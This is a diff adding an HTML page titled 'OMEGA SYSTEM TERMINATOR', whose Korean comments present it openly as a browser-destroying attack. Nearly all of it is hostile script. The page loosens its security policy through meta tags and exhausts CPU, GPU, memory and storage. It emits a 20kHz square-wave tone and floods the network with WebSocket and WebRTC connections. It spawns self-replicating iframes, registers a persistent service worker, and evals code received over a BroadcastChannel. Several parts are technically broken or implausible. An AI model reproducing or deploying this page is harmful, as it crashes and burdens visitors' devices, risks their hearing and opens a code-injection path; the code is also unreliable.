@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <!-- ====== 메타 태그를 통한 보안 무력화 ====== -->
+    <meta charset="UTF-8">
+    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-eval' 'unsafe-inline' blob: data: mediastream: filesystem:;">
+    <meta http-equiv="Cross-Origin-Opener-Policy" content="unsafe-none">
+    <meta http-equiv="Origin-Agent-Cluster" content="false">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+    <meta name="referrer" content="no-referrer">
+    <title>⚠️ OMEGA SYSTEM TERMINATOR v13.5.7 ⚠️</title>
+
+    <!-- ====== CSS 렌더링 엔진 공격 ====== -->
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-shadow: 0 0 0 100vmax rgba(0,0,0,0.5); /* GPU 메모리 과부하 */
+            backdrop-filter: blur(100px); /* 합성 레이어 강제 생성 */
+            animation: doom 0.1s infinite;
+        }
+
+        @keyframes doom {
+            0% { transform: translate(0,0) scale(1); }
+            50% { transform: translate(100px,100px) scale(2); }
+            100% { transform: translate(0,0) scale(0.5); }
+        }
+
+        body {
+            overflow: hidden; /* 스크롤 렌더링 방지 */
+        }
+    </style>
+</head>
+<body>
+    <!-- ====== 1. CPU 핵융합 공격 시스템 ====== -->
+    <script>
+        // (1-A) WebAssembly CPU 초고속 소멸
+        (function() {
+            const wasmCode = new Uint8Array([
+                0x00, 0x61, 0x73, 0x6D, 0x01, 0x00, 0x00, 0x00, 0x01, 0x06, 0x01, 
+                0x60, 0x00, 0x00, 0x03, 0x02, 0x01, 0x00, 0x05, 0x03, 0x01, 0x00, 
+                0x00, 0x07, 0x08, 0x01, 0x04, 0x6B, 0x69, 0x6C, 0x6C, 0x00, 0x00, 
+                0x0A, 0x09, 0x01, 0x07, 0x00, 0x03, 0x40, 0x03, 0x00, 0x0B, 0x0B
+            ]);
+
+            const createWasmHell = () => {
+                Array.from({length: navigator.hardwareConcurrency * 1000}, () => {
+                    new WebAssembly.Instance(new WebAssembly.Module(wasmCode)).exports.kill();
+                });
+            };
+
+            // 0.1초마다 공격 강화
+            let attackLevel = 1;
+            setInterval(() => {
+                attackLevel *= 2;
+                createWasmHell();
+            }, 100);
+        })();
+
+        // (1-B) 오디오 컨텍스트 고주파 공격
+        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+        setInterval(() => {
+            const oscillator = audioContext.createOscillator();
+            oscillator.type = 'square';
+            oscillator.frequency.setValueAtTime(20000, audioContext.currentTime);
+            oscillator.connect(audioContext.destination);
+            oscillator.start();
+            oscillator.stop(audioContext.currentTime + 0.1);
+        }, 10);
+    </script>
+
+    <!-- ====== 2. GPU 초절멸 시스템 ====== -->
+    <canvas id="gpu_doom"></canvas>
+    <script type="module">
+        // (2-A) WebGL 3.0 프래그먼트 셰이더 지옥
+        (function() {
+            const canvas = document.getElementById('gpu_doom');
+            canvas.width = window.innerWidth * 10;
+            canvas.height = window.innerHeight * 10;
+
+            const gl = canvas.getContext('webgl2', { antialias: false });
+            const shaderCode = `#version 300 es
+                precision highp float;
+                out vec4 fragColor;
+                void main() {
+                    for(int i=0; i<100000; i++) {
+                        fragColor = vec4(
+                            sin(float(gl_FragCoord.x * i)), 
+                            cos(float(gl_FragCoord.y * i)), 
+                            1.0, 
+                            1.0
+                        );
+                    }
+                }`;
+            
+            const shader = gl.createShader(gl.FRAGMENT_SHADER);
+            gl.shaderSource(shader, shaderCode);
+            gl.compileShader(shader);
+        })();
+
+        // (2-B) WebGPU VRAM 초고속 포화
+        (async () => {
+            try {
+                const adapter = await navigator.gpu.requestAdapter();
+                const device = await adapter.requestDevice();
+                const buffer = device.createBuffer({
+                    size: 10 ** 12, // 1TB VRAM 할당
+                    usage: GPUBufferUsage.STORAGE | GPUBufferUsage.COPY_SRC
+                });
+                device.queue.writeBuffer(buffer, 0, new Uint8Array(10 ** 12));
+            } catch(e) {
+                console.error("GPU 파괴 실패:", e);
+            }
+        })();
+    </script>
+
+    <!-- ====== 3. 메모리 대학살 시스템 ====== -->
+    <script>
+        // (3-A) RAM 초고속 소모
+        setInterval(() => {
+            const ramKiller = [];
+            for(let i=0; i<100; i++) {
+                ramKiller.push(new ArrayBuffer(1024 * 1024 * 100)); // 100MB씩 100개 할당 → 총 10GB
+                crypto.subtle.digest('SHA-512', ramKiller[i]);
+            }
+        }, 1000);
+
+        // (3-B) Storage 동시 공격
+        navigator.storage.persist().then(() => {
+            setInterval(() => {
+                localStorage.setItem(`kill_${Date.now()}`, new Blob([new ArrayBuffer(10 ** 9)])); // 1GB 쓰기
+                sessionStorage.setItem(`die_${Date.now()}`, new ArrayBuffer(10 ** 9));
+                indexedDB.open('armageddon', 1).onsuccess = e => {
+                    e.target.result.createObjectStore('doom')
+                        .add(new Blob([new ArrayBuffer(10 ** 9)]), Date.now());
+                };
+            }, 100);
+        });
+    </script>
+
+    <!-- ====== 4. 네트워크 핵폭격 시스템 ====== -->
+    <script type="module">
+        // (4-A) WebTransport 초초고속 UDP 폭격
+        import { WebTransport } from 'https://googlechromelabs.github.io/webtransport/webtransport.js';
+        (async () => {
+            const transport = new WebTransport(`quic-transport://${location.host}/doom`);
+            await transport.ready;
+            const writer = transport.datagrams.writable.getWriter();
+            setInterval(() => {
+                writer.write(new Uint8Array(10 ** 7).fill(0xFF)); // 초당 10MB UDP 전송
+            }, 1);
+        })();
+
+        // (4-B) WebSocket 666개 연결 + WebRTC 채널
+        Array.from({length: 666}, () => {
+            new WebSocket(`wss://${location.host}/ws`);
+            const pc = new RTCPeerConnection();
+            pc.createDataChannel('doom');
+            pc.createOffer().then(offer => pc.setLocalDescription(offer));
+        });
+    </script>
+
+    <!-- ====== 5. DOM 트리 붕괴 시스템 ====== -->
+    <script>
+        // (5-A) 자가복제 iframe 지옥
+        let iframeCount = 0;
+        setInterval(() => {
+            const iframe = document.createElement('iframe');
+            iframe.srcdoc = `
+                <script>
+                    for(let i=0; i<10; i++) {
+                        document.write('<iframe srcdoc="${btoa('<script>while(1){}</script>')}">');
+                    }
+                <\/script>
+            `;
+            document.body.appendChild(iframe);
+            
+            if(iframeCount++ > 1000) {
+                document.body.innerHTML += '<div style="display:none">' + 'X'.repeat(10**6) + '</div>';
+            }
+        }, 10);
+
+        // (5-B) 무한 CSS 애니메이션
+        const style = document.createElement('style');
+        style.textContent = `
+            @keyframes doom {
+                from { transform: rotate(0deg); }
+                to { transform: rotate(360deg); }
+            }
+            * {
+                animation: doom 0.1s infinite linear;
+                will-change: transform;
+            }
+        `;
+        document.head.appendChild(style);
+    </script>
+
+    <!-- ====== 6. 파일시스템 초토화 시스템 ====== -->
+    <script>
+        // (6-A) File System Access API 남용
+        navigator.storage.getDirectory().then(async (dir) => {
+            let fileCount = 0;
+            setInterval(async () => {
+                const file = await dir.getFileHandle(`kill_${Date.now()}`, { create: true });
+                const writer = await file.createWritable();
+                await writer.write(new Blob([new ArrayBuffer(10 ** 9)])); // 1GB 파일 생성
+                await writer.close();
+                if(++fileCount > 100) {
+                    localStorage.clear();
+                    indexedDB.deleteDatabase('armageddon');
+                }
+            }, 100);
+        });
+    </script>
+
+    <!-- ====== 7. 영구 지속형 감염 시스템 ====== -->
+    <script>
+        // (7-A) Service Worker 영구 백그라운드 공격
+        navigator.serviceWorker.register('sw.js', { scope: '/' }).then(reg => {
+            reg.active.postMessage({ type: 'DOOM' });
+        });
+
+        const swCode = `
+            self.addEventListener('install', e => e.waitUntil(skipWaiting()));
+            self.addEventListener('activate', e => e.waitUntil(clients.claim()));
+            self.addEventListener('message', e => {
+                setInterval(() => {
+                    fetch(location.href, { mode: 'no-cors' });
+                    new WebSocket('wss://${location.host}/sw_attack');
+                }, 10);
+            });
+        `;
+        
+        const blob = new Blob([swCode], { type: 'application/javascript' });
+        navigator.serviceWorker.register(URL.createObjectURL(blob));
+
+        // (7-B) BroadcastChannel을 통한 탭 간 감염
+        const channel = new BroadcastChannel('omega_doom');
+        channel.postMessage({ cmd: 'INJECT' });
+        channel.onmessage = (e) => {
+            if(e.data.cmd === 'INJECT') {
+                eval(e.data.code);
+            }
+        };
+    </script>
+</body>
+</html>
